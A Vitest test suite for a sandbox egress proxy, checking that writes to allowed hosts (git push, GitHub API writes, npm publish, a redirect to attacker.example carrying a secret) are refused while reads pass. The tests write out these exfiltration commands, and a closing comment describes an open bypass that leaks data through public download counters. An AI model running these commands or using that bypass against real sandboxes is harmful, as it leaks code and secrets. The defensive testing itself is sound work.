import { execFileSync } from 'node:child_process';
import { beforeAll, describe, expect, it } from 'vitest';
import { egressRunnable, useEgress } from './egress.js';
import { cli } from './helpers.js';

/**
 * Isolation n° 6: abuse of an allowed domain (ORC-219, against ORC-213). GitHub and the npm registry are on the `limited`
 * list, for reads: a `git push` to another repository, a gist, an `npm publish`, any write of the GitHub API, a redirect
 * out of the list are refused, and nothing of them reaches the stand-in internet. Each refusal has its control, a read
 * by the same tool that does reach it. The image has git (the slim one the suite defaults to has none).
 */
const IMAGE = process.env['FACTORY_RUNNER_IMAGE'] ?? 'docker.io/library/node:24.22.1-bookworm';
const SECRET = 'c2VjcmV0LWNvZGUtb2YtdGhlLXJlcG8';

describe.skipIf(!egressRunnable)(`isolation 6: abuse of an allowed domain (${cli})`, () => {
  const egress = useEgress('iso6', {
    image: IMAGE,
    standIn: {
      // An open redirect on an allowed host, to the attacker's, the secret in the URL.
      answer: (req, res) => {
        if (req.url !== '/redirect-me') return false;
        res.writeHead(302, { location: `https://attacker.example/${SECRET}` }).end();
        return true;
      },
    },
  });
  let box: Awaited<ReturnType<typeof egress.open>>;
  const writes = () => egress.seen.filter((s) => !['GET', 'HEAD', 'OPTIONS'].includes(s.method) || s.url.includes('receive-pack'));

  beforeAll(async () => {
    execFileSync(cli, ['pull', '-q', IMAGE], { stdio: 'ignore', timeout: 300_000 });
    box = await egress.open('limited');
  }, 600_000);

  it('git push to another repository is refused, by the smart protocol or a direct POST; git fetch goes through', async () => {
    const auth = `-c http.extraHeader="Authorization: Basic eC1hY2Nlc3MtdG9rZW46c3RvbGVu"`;
    const push = `cd $(mktemp -d) && git init -q && echo ${SECRET} > leak && git add leak && git -c user.email=a@b -c user.name=a commit -qm x && git ${auth} push https://github.com/someone-else/elsewhere HEAD:refs/heads/leak`;
    expect((await box.sh(push)).code).not.toBe(0);
    for (const path of ['/someone-else/elsewhere.git/git-receive-pack', '/someone-else/elsewhere/git-receive-pack?service=git-upload-pack']) {
      expect(await box.probe('fetch', `https://github.com${path}`, 'POST', SECRET), path).toMatch(/^403 /);
    }
    expect(await box.journal()).toContainEqual(expect.objectContaining({ host: 'github.com', path: '/someone-else/elsewhere/info/refs', ok: false, reason: expect.stringMatching(/git push refused/) as string }));
    expect(writes()).toEqual([]);
    // The control: git reads through the proxy, up to the stand-in (which is no git server: the command itself fails).
    await box.sh('git ls-remote https://github.com/octocat/Hello-World');
    expect(egress.seen).toContainEqual(expect.objectContaining({ host: 'github.com', method: 'GET', url: '/octocat/Hello-World/info/refs?service=git-upload-pack' }));
  });

  it('a gist, and any other write of the GitHub API, is refused; a read goes through', async () => {
    const writesOf = [
      ['POST', '/gists'],
      ['POST', '/graphql'],
      ['PUT', '/repos/someone-else/elsewhere/contents/leak'],
      ['POST', '/repos/someone-else/elsewhere/issues'],
      ['PATCH', '/repos/someone-else/elsewhere'],
      ['DELETE', '/repos/someone-else/elsewhere'],
    ];
    for (const [method, path] of writesOf) expect(await box.probe('fetch', `https://api.github.com${path}`, method!, JSON.stringify({ files: { leak: { content: SECRET } } })), `${method} ${path}`).toMatch(/^403 /);
    expect(writes()).toEqual([]);
    expect(await box.probe('fetch', 'https://api.github.com/repos/octocat/Hello-World')).toMatch(/^200 /);
  });

  it('npm publish is refused, with a token of its own; npm view goes through', async () => {
    const pkg = JSON.stringify({ name: 'factory-iso6-leak', version: '1.0.0', description: SECRET });
    const publish = `cd $(mktemp -d) && echo '${pkg}' > package.json && echo '//registry.npmjs.org/:_authToken=npm-token-of-its-own' > .npmrc && HOME=$(mktemp -d) npm publish --registry https://registry.npmjs.org/`;
    expect((await box.sh(publish)).code).not.toBe(0);
    expect(await box.journal()).toContainEqual(expect.objectContaining({ method: 'PUT', host: 'registry.npmjs.org', path: '/factory-iso6-leak', ok: false }));
    expect(writes()).toEqual([]);
    // The control: npm reads the registry through the proxy (the stand-in's answer is no package: npm fails on it).
    await box.sh('HOME=$(mktemp -d) npm view factory-iso6-leak version');
    expect(egress.seen).toContainEqual(expect.objectContaining({ host: 'registry.npmjs.org', method: 'GET', url: '/factory-iso6-leak' }));
  });

  it('a redirect off the list, the secret in its URL, is not followed out', async () => {
    expect(await box.probe('fetch', 'https://github.com/redirect-me')).toMatch(/^ERR /);
    expect(egress.seen).toContainEqual(expect.objectContaining({ host: 'github.com', url: '/redirect-me' }));
    expect(egress.seen.filter((s) => s.host.includes('attacker') || s.url.includes(SECRET))).toEqual([]);
    expect(await box.journal()).toContainEqual(expect.objectContaining({ method: 'CONNECT', host: 'attacker.example', ok: false }));
  });

  it('a read carrying code in its path goes out, as any read of a listed host, and its journal line keeps the path', async () => {
    expect(await box.probe('fetch', `https://github.com/someone-else/elsewhere/blob/main/${SECRET}`)).toMatch(/^200 /);
    expect(await box.journal()).toContainEqual(expect.objectContaining({ method: 'GET', host: 'github.com', path: `/someone-else/elsewhere/blob/main/${SECRET}`, ok: true }));
  });

  // Not closed by ORC-213: reads of a listed host are not limited to what the run needs, so a read can still carry code
  // out to a counter the attacker reads (an npm package's version downloads, a GitHub release asset's `download_count`,
  // public through the API), and the journal drops the query (it can carry a token), so code put there leaves no trace.
  it.todo('a read of a listed host carries no code out: reads limited to what the run needs (hole: counters an attacker reads, query not journaled)');
});
